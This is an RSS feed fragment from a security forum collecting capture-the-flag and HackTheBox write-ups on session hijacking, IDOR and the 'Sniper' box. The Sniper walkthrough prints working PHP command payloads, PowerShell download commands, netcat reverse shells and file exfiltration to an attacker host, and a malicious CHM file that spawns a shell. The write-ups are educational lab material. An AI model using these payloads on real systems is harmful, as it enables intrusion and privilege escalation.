<p><span alt="gobuster" data-base62-sha1="3SdrU2Pl2daAfZ9O4vU7xFDAb2z" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If we access the log, we see it’s content.</p>
<p>There are several entries that are looking like this one.</p>
<pre><code>Timestamp: 1584680782
Host: exercise-4.0x00sec.dev
Connection: close
X-Real-Ip: 138.197.209.37
X-Forwarded-For: 138.197.209.37
X-Forwarded-Proto: https
X-Forwarded-Ssl: on
X-Forwarded-Port: 443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: */*
Cookie: PHPSESSID=4a95c7eedff98581d964f7a8f74da9e5
</code></pre>
<p>We can assume that the entries will get appended in chronological order.<br>
You can also checkout the timestamps and convert them with for example <a href="https://www.unixtimestamp.com/index.php" rel="nofollow noopener">unixtimestamp.com</a> to be sure.</p>
<p>Depending on when you make this challenge the debug log can be quite big. And sometimes the browser can have problems displaying it.</p>
<p>We can download it with <code>wget</code> and show it’s content with <code>less</code>.</p>
<pre><code>wget https://exercise-4.0x00sec.dev/debug.log

less +G debug.log.html
</code></pre>
<p>The <code>+G</code> will scroll to the bottom of the file. <code>+</code> for immediately invoke a command and <code>G</code> to scroll to the end of the file.</p>
<p>From here it should be relatively easy, because the debug.log contains the PHP Session Cookie. We can try a <a href="https://en.wikipedia.org/wiki/Session_hijacking" rel="nofollow noopener">Session Hijacking Attack</a>.</p>
<p>To perform this attack, we need to latest cookie. Thats why we scrolled to the end of the file.</p>
<p>We just copy the <code>PHPSESSID</code> value, open chrome devtools and replace our <code>PHPSESSID</code> value with the one from the debug.log.</p>
<p><span alt="phpsessid" data-base62-sha1="8NakJISrbEhervqJhPNzJyT75b7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>After we refresh the page we should be logged in and see the flag.</p>
<h2>Conclusion</h2>
<p>This is a very cool exercise and a serious vulnerability. In the end of last year, someone was able to hijack the session of a hackerone employee and gained access to all private programs and bug reports.</p>
<p><a href="https://hackerone.com/reports/745324" rel="nofollow noopener">https://hackerone.com/reports/745324</a></p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-4/20232">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-4/20232</link>
          <pubDate>Fri, 03 Apr 2020 14:08:46 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20232</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-4/20232.rss">Writeup: 0x00sec CTF - Exercise #4</source>
        </item>
        <item>
          <title>(VulnHub) DevRandom CTF: 1.1 | WriteUp</title>
          <dc:creator><![CDATA[DamaneDz]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>Hello guys,<br>
This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from <a href="https://www.vulnhub.com/entry/devrandom-ctf-11,450/" rel="nofollow noopener">VulnHub</a>.<br>
For challengers and CTF players you can try it before reading my solution.<br>
P.S:both video and text writeup are included.</p>

Summary <a href="https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195/1">(click for more details)</a>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195</link>
          <pubDate>Wed, 01 Apr 2020 18:58:00 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20195</guid>
          <source url="https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195.rss">(VulnHub) DevRandom CTF: 1.1 | WriteUp</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Sniper</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><span alt="image" data-base62-sha1="dGgVB0JxiSOHnJDpX8EKmuHG6ZV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>I haven’t posted one of my writeups here in a while so I thought I would make one for an interesting box that just got retired: Sniper.</p>
<p>I really liked this box because it went places that I haven’t seen other boxes exploring, like RFI with a twist and creating a malicious CHM documentation file to escalate privileges, all things worth learning.</p>
<hr>
<h2>Enumeration</h2>
<p>An nmap scan probing all ports for services and running all default NSE scripts only returns a few results, RPC, SMB, and HTTP:</p>
<pre><code class="lang-auto">┌─[baud@parrot]─[~/HTB/sniper]
└──╼ $sudo nmap -sV -sC -p- -oA fullScan -T4 10.10.10.151
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 02:20 CET
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-26T09:25:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.42 seconds
</code></pre>
<p>SMB NULL sessions are not allowed so not much enumeration is possible with tools like enum4linux:</p>
<pre><code class="lang-auto">┌─[✗]─[baud@parrot]─[~/HTB/sniper]
└──╼ $enum4linux 10.10.10.151 2&gt;/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 26 02:40:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.151    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.151    |
 ============================================ 
Looking up status of 10.10.10.151
No reply from 10.10.10.151

 ===================================== 
|    Session Check on 10.10.10.151    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
</code></pre>
<p>The homepage of the web server does not contain anything useful other than a bunch of links to other pages:</p>
<p><span alt="image" data-base62-sha1="vgZU1Ko9CMAIFZRskv2SSlpgLP6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>One of the pages is a blog with a few placeholder posts in it and two dropdown menus:</p>
<p><span alt="image" data-base62-sha1="9hN4tnG1MGCLb7k7AVxD2m7ogAY" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>There’s also a simple login portal:</p>
<p><span alt="image" data-base62-sha1="1fp1dJowNEDd75ALrXguL722Hda" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The portal allows to create an account via the registration.php page:</p>
<p><span alt="image" data-base62-sha1="d0M9mQ1ZZrbSY0lWJ2tNSDAWleh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Registering a new account and using it to login takes to an under construction page from where the only option is to log out:</p>
<p><span alt="image" data-base62-sha1="y1ISn1ALm2xlS3p09Av45yG8XrL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Back to the blog, the drop-down Language menu has a few links, each of which redirects to the same blog page but passing it an argument containing the name of a PHP page:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=blog-en.php
</code></pre>
<p>Trivial LFI payloads on the parameter don’t seem to work, these are the ones I’ve tried myself:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/index.php --&gt; loads properly
http://10.10.10.151/blog/?lang=blog-en.php --&gt; loads properly
http://10.10.10.151/blog/blog-es.php --&gt; loads properly
http://10.10.10.151/blog/?lang=././blog-en.php --&gt; loads properly
http://10.10.10.151/blog/?lang=../index.php --&gt; not found
http://10.10.10.151/blog/?lang=..../index.php --&gt; not found
http://10.10.10.151/blog/?lang=.../index.php --&gt; not found
http://10.10.10.151/blog/?lang=../blog/blog-en.php --&gt; not found
http://10.10.10.151/blog/?lang=../../../../../index.php --&gt; not found
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.php --&gt; ..%2f..%2f..%2f..%2f..%2findex.php
</code></pre>
<hr>
<h2>Exploitation: RFI via SMB</h2>
<p>At this point I tried RFI as well, which is pretty rare but it never hurts to try. It turns out that the web application will not include any page that is passed to it via HTTP, but it will access pages located in shared folders via SMB:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=\\10.10.14.144\sniper\hello.php
</code></pre>
<p>We can set up a Samba share to welcome the connection and serve a PHP page to the web application by adding an entry to /usr/share/samba/smb.conf fpr a dedicated share:</p>
<pre><code class="lang-auto">[sniper]
path = /home/baud/HTB/sniper   
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
</code></pre>
<p>Restart the smbd service:</p>
<pre><code class="lang-auto">baud@kali:~$ sudo service smbd restart
</code></pre>
<p>Verify that the share now exists:</p>
<pre><code class="lang-auto">baud@kali:~$ smbclient -N -L localhost

	Sharename       Type      Comment
	---------       ----      -------
	sniper          Disk      
	IPC$            IPC       IPC Service (Heyo)
SMB1 disabled -- no workgroup available
</code></pre>
<p>Put any PHP file of your choice in there and import it through the URL:</p>
<p><span alt="image" data-base62-sha1="koTlQlixZdyZY7EwyerDOTgs1AV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now we can execute any PHP code in the context of the vulnerable web application, for example we can demonstrare RCE with a simple “whoami”:</p>
<pre><code class="lang-php">&lt;?php
        echo "&lt;pre&gt;";
        system('whoami');
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Which returns in the page:</p>
<p><span alt="image" data-base62-sha1="6iy6KGansyECgy3BAypjHEtmGDh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>We could keep doing this manually for each command, for example here’s how to download files on the host:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"IWR http://10.10.14.144/nc.exe -OutFile ./nc.exe\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Although nc.exe is flagged as malicious and deleted by Defender. A Nishang reverse shell with download cradle does not work either, and it is easy to tell why with this payload:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"\$ExecutionContext.SessionState.LanguageMode\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>The result is:</p>
<p><span alt="image" data-base62-sha1="nOKRqlueZMo77LdF062ahc7ME15" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So PowerShell’s constrained language is also enabled, limiting the actions we can perform with it.</p>
<p>After getting tired of changing the payload manually every time I found a <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php" rel="nofollow noopener">web shell</a> that works out of the box without being destroyed by Defender:</p>
<p><span alt="image" data-base62-sha1="7KpCAElXJxmbmav44OlfuOVhkrq" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>From here shell commands have to be escaped slightly, for example:</p>
<p><span alt="image" data-base62-sha1="pNcPviEX4XgJfqLLrMYlLbTr4Uh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#1:</span> Passwsord Reuse + PSSession</h2>
<p>The user folder has an old version of the registration page but the most interesting part is the db.php file in the same directory, which has the database credentials in it:</p>
<pre><code class="lang-php">&lt;?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?&gt;
</code></pre>
<p>At first I didn’t mind it too much and started enumerating MySQL by creating PHP pages to query it for all its databases and tables but with no great results (the only thing I found was an MD5 hash for a “superuser” user which I could not crack).</p>
<p>After a little break and some thinking I forgot to check for one of the weaknesses I so often underestimate: password reuse. I found out the database password is basically Chris’ account password, I verified this with smbclient by being able to list the shares with his account:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris -L \\\\10.10.10.151
Enter WORKGROUP\chris's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre>
<p>As established at the beginning, anonymous users are not allowed to list shares on the box, meaning the credentials are correct:</p>
<pre><code class="lang-auto">User: chris
Pass: 36mEAhz/B8xQ~2VM
</code></pre>
<p>Still, Chris can’t access the C$ share anyway:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris \\\\10.10.10.151\\C$
Enter WORKGROUP\chris's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<p>With a set of working credentials and nowhere to use them I was forced to drop files on the box. My first try was with the nc-family of binaries, using this command:</p>
<pre><code class="lang-auto">powershell -command iwr http://10.10.14.144/ncat.exe -outfile \"c:\users\all users\data\ncat.exe\""
</code></pre>
<p>But Defender is always ready to stop the fun by flagging the binaries. Here’s what I tried downloading and what worked:</p>
<pre><code class="lang-auto">nc --&gt; flagged
ncat --&gt; flagged
nc64 --&gt; works!
</code></pre>
<p>After downloading nc64 on the box I can call it from the web shell to contact my own host with a reverse shell:</p>
<pre><code class="lang-auto">"c:\users\all users\data\nc64.exe" -e cmd.exe 10.10.14.144 9999
</code></pre>
<p>And my listener receives a connection giving me a proper shell at last:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49737
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>We can become Chris by starting a PSSession with his credentials, since PSSessions aren’t blocked by the CLM. First we enter the PowerShell console:</p>
<pre><code class="lang-auto">C:\inetpub\wwwroot\blog&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>Then we put the user’s password in a variable as a SecureString:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pw = ConvertTo-SecureString -String "36mEAhz/B8xQ~2VM" -AsPlainText -force
</code></pre>
<p>The password is used to create a PSCredential object together with the username:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\chris", $pw
</code></pre>
<p>Now the Enter-PSSession cmdlet can be used to start a PSSession using that PSCredential object, which makes us impersonate Chris:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Chris\Documents&gt;
</code></pre>
<p>I downloaded nc64.exe again to get a proper reverse shell instead of the uncomfortable PSSession:</p>
<pre><code class="lang-auto">[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { IWR http://10.10.14.144/nc64.exe -outfile C:\Users\Chris\Documents\nc64.exe }
[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { C:\Users\Chris\Documents\nc64.exe -e cmd.exe 10.10.14.144 9090 }
</code></pre>
<p>I could have easily used the already downloaded nc64 but for some reason I was having issues navigating folders inside the PSSession so it was more comfortable to have another nc64 in the . directory. The new incoming connection is caught and we have a shell as Chris:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49779
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents&gt;dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Documents

02/28/2020  02:53 PM    &lt;DIR&gt;          .
02/28/2020  02:53 PM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               402 desktop.ini
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Music [C:\Users\Chris\Music]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Pictures [C:\Users\Chris\Pictures]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Videos [C:\Users\Chris\Videos]
02/28/2020  02:53 PM            45,272 nc64.exe
               2 File(s)         45,674 bytes
               5 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris\Documents&gt;
</code></pre>
<p>While the user flag is in Chris’ desktop, his downloads folder contains an interesting instructions.chm file:</p>
<pre><code class="lang-auto">C:\Users\Chris&gt;dir /a downloads
dir /a downloads
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\downloads

04/11/2019  07:36 AM    &lt;DIR&gt;          .
04/11/2019  07:36 AM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               282 desktop.ini
04/11/2019  07:36 AM            10,462 instructions.chm
               2 File(s)         10,744 bytes
               2 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris&gt;
</code></pre>
<p>CHM files are typically shipped witht a program, containing its official documentation. The file can be transfered to us for analysis via nc64:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;..\Documents\nc64.exe -w 3 10.10.14.144 9191 &lt; instructions.chm
</code></pre>
<p>And saved locally like this:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9191 &gt; instructions.chm
listening on [any] 9191 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49810
baud@kali:~/HTB/sniper$ file instructions.chm 
instructions.chm: MS Windows HtmlHelp Data
</code></pre>
<p>This is what the file looks like:</p>
<p><span alt="image" data-base62-sha1="ecvYYcKzoO9VWnj0wFmoSEWBTuO" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This shitty work Chris is talking about is mentioned in the note.txt file in C:\Docs, where we get to appreciate the relationship between this evil CEO and poor coder Chris:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;dir /a c:\docs
dir /a c:\docs
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\docs

10/01/2019  12:04 PM    &lt;DIR&gt;          .
10/01/2019  12:04 PM    &lt;DIR&gt;          ..
04/11/2019  08:31 AM               285 note.txt
04/11/2019  08:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,930,002,432 bytes free

C:\Users\Chris\Downloads&gt;more c:\docs\note.txt
more c:\docs\note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

C:\Users\Chris\Downloads&gt;
</code></pre>
<p>I absolutely love the “PHP for dummies” pdf in the directory just to tease him further on his bad PHP skills. Anyway he mentions dropping the documentation in the Docs folder, probably in CHM format because the file from earlier was supposed to be the Android app documentation.</p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#2:</span> RCE With CHM File</h2>
<p>It’s obvious that we have to finish Chris’ job and make a malicious CHM file that the Administrator will open at one point.</p>
<p>Using <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7" rel="nofollow noopener">this</a> GitHub page as reference I started running a few tests locally after installing the HTML Help WorkShop on a Windows 10 box. I’m pretty sure there’s a way to craft CHM files on Linux too but if I remember correctly it involves Wine and when I use Wine nothing works, so I went the Windows way.</p>
<p>This is the base code provided by GitHub:</p>
<pre><code class="lang-auto">&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe &gt; nul &amp;&amp; %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8000/test.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
</code></pre>
<p>Basically the code simulates a button that presses itself triggering the payload contained in Item1, which is far more complicated than it needs to be for this single challenge so I’ll make it simpler.</p>
<p>After obtaining the a.html file contained in the original CHM found on the box by unpacking it with 7zip we can simply change the code to make it look like this:</p>
<pre><code class="lang-auto">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Sniper Android App Documentation&lt;/h1&gt;
&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c c:\users\chris\documents\nc64.exe -e cmd.exe 10.10.14.144 6666'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
&lt;h2&gt;Table of Contents&lt;/h2&gt;

&lt;p&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!&lt;/p&gt;
&lt;p&gt;I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>This reuses the nc64 binary dropped in Chris’ folder to start yet another reverse shell. Create a new project in the HTML Help WorkShop with that code and compile it, then drop the output CHM file in C:\Docs and soon enough what I can only presume to be the CEO will open it giving us a shell as the Administrator:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49812
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
sniper\administrator

C:\Windows\system32&gt;
</code></pre>
<p>And that was Sniper.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-sniper/20112">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-sniper/20112</link>
          <pubDate>Sat, 28 Mar 2020 18:53:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20112</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #3</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p><span alt="header-ctf-0x00sec" data-base62-sha1="wOiVhJMMswDlMlkqZB8w6ZTLfjQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#3</span>
</h1>
<p>Another day, another ctf challenge.  This time no. 3 of the web exercises</p>
<h2>Challenge</h2>
<p>As you may have read my previous write-ups you will know that it is always good to checkout the page source first. As you can get a lot of useful information out of it.</p>
<p>And this time, we also proceed the same way.</p>
<p><span alt="ctf-source" data-base62-sha1="6uZ6GtMRSTe4TsdpWtjZSDDyLf5" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If we take a look at the page source, we will find a left-over html comment with a nice hint.</p>
<pre><code class="lang-auto">  &lt;!-- TODO: --&gt;
  &lt;!-- * Implement secure object references--&gt;
</code></pre>
<h2>Object References</h2>
<p>Well, if you not familiar with this kind of attack you may want to google a bit and after a while you will find tons of articles about IDOR (Insecure Direct Object Reference) attacks.</p>
<p><a href="https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf" rel="nofollow noopener">OWASP</a>for example is always a good source of information and worth a read.</p>
<h2>The Attack</h2>
<p>Based on the hint, let’s assume that we are dealing here with an IDOR Vulnerability.</p>
<p>But, … we only see a login field in there. Nothing more. Now it is guessing time.<br>
Let’s try to login with some commonly used credentials. If we try <code>admin:admin</code> we are logged in.</p>
<p><span alt="login" data-base62-sha1="y3P0UvH3ULXBrJ4E6hqfelFRbnx" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If we take a close look at the URL we see that is has the query parameter <code>user_id=5</code> . We can assume that this is our <code>user_id</code>.</p>
<p>But what happens if we supply another <code>user_id</code> ?</p>
<p>If we visit <code>user_id=1</code> we get the profile of another user. Now we just need to test along the ids.</p>
<p>And with <code>user_id=2</code> we get a profile where the flag is hidden.</p>
<h2>Conclusion</h2>
<p>This was a fun little challenge which teaches you one of the most important and critical vulnerabilities.</p>
<p>Some examples from hackerone:</p>
<ul>
<li><a href="https://hackerone.com/reports/681473" rel="nofollow noopener">https://hackerone.com/reports/681473</a></li>
<li><a href="https://hackerone.com/reports/380410" rel="nofollow noopener">https://hackerone.com/reports/380410</a></li>
<li><a href="https://hackerone.com/reports/148764" rel="nofollow noopener">https://hackerone.com/reports/148764</a></li>
</ul>
<p>Happy Hacking.</p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-3/19957">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-3/19957</link>
          <pubDate>Sat, 21 Mar 2020 15:34:55 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19957</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-3/19957.rss">Writeup: 0x00sec CTF - Exercise #3</source>
        </item>
        <item>
          <title>B01lers CTF: Jumpdrive Writeup</title>
          <dc:creator><![CDATA[0xDilydali]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <h1>Bo1lers CTF: Jumpdrive Write</h1>
Hey everyone, welcome to my write-up for the PWN challenge: Jumpdrive from the b01lers CTF! This is my first ever write-up, and my first timed CTF on a team. It was a ton of fun, and I learned a whole lot from this experience even though I personally only solved one challenge.
<h1>Starting Out</h1>
<p>Looking at the challenge we are given a host and a port to connect to as well as a link to download the binary. </p>
<p><span alt="Jumpdrive_Chal_Details" data-base62-sha1="p9vf1OEYIJRx6EeUga80An9L8px" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
I’m first going to connect with nc to test what the program is doing.</p>
<p><span alt="NC_Run_Command" data-base62-sha1="9a1L1V7YZRmD4DRqE1gjc9U2Dhi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
